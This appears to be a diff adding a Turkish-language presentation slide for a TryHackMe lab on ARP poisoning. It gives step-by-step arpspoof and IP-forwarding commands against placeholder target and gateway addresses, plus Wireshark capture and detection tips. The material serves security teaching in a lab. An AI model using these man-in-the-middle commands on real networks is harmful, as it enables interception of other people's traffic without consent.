@@ -1,0 +1,44 @@
+<!-- SLIDE 31: Unified Interactive TryHackMe Lab -->
+<section>
+  <h2><i class="fa-solid fa-laptop-code highlight-htb"></i> İnteraktif Lab: TryHackMe ile Canlı Uygulama</h2>
+  <p class="slide-subtitle">
+    Laboratuvar ortamını başlatıp hedef ve ağ geçidi arasındaki trafiği hep birlikte ele geçiriyoruz.
+  </p>
+
+  <div class="grid-2">
+    <!-- Card 1: Adım Adım Akış -->
+    <div class="cyber-card secure">
+      <div class="card-title">
+        <span class="cyber-badge badge-htb">TALİMATLAR</span> 4 Adımda Lab Akışı
+      </div>
+      <ul class="secure-list" style="margin-bottom: 0;">
+        <li><strong>1. Odaya Bağlanın:</strong> THM VPN veya AttackBox ile laboratuvar hedefini başlatın.</li>
+        <li><strong>2. İlk Durumu Gözlemleyin:</strong> Kurban terminalinde mevcut tabloyu listeleyin: <code style="color: var(--htb-green);">arp -a</code></li>
+        <li><strong>3. Zehirlemeyi Başlatın:</strong> Saldırgan makinede yönlendirmeyi açıp arpspoof aracını çalıştırın.</li>
+        <li><strong>4. Wireshark ile Analiz Edin:</strong> Kurbanda tablonun değişimini ve geçen HTTP trafiğini izleyin.</li>
+      </ul>
+    </div>
+
+    <!-- Card 2: Terminal Komutları -->
+    <div>
+      <div class="terminal-header">
+        <span class="terminal-dot dot-red"></span>
+        <span class="terminal-dot dot-yellow"></span>
+        <span class="terminal-dot dot-green"></span>
+        <span class="terminal-title">user@attackbox:~# lab-commands</span>
+      </div>
+      <pre><code class="language-bash"># 1. IP Yönlendirmeyi Etkinleştir
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# 2. Kurban ve Gateway Arasına Gir
+sudo arpspoof -i eth0 -t &lt;TARGET_IP&gt; &lt;GATEWAY_IP&gt;
+sudo arpspoof -i eth0 -t &lt;GATEWAY_IP&gt; &lt;TARGET_IP&gt;
+
+# 3. Paketleri Dinle & Filtrele
+wireshark &  # Filtre: arp || http</code></pre>
+      <div style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted); margin-top: 0.4rem; text-align: center;">
+        <i class="fa-solid fa-lightbulb highlight-yellow"></i> <strong>İpucu:</strong> Wireshark'ta <code style="color: var(--accent-cyan);">arp.duplicate-address-detected</code> uyarısını arayın.
+      </div>
+    </div>
+  </div>
+</section>
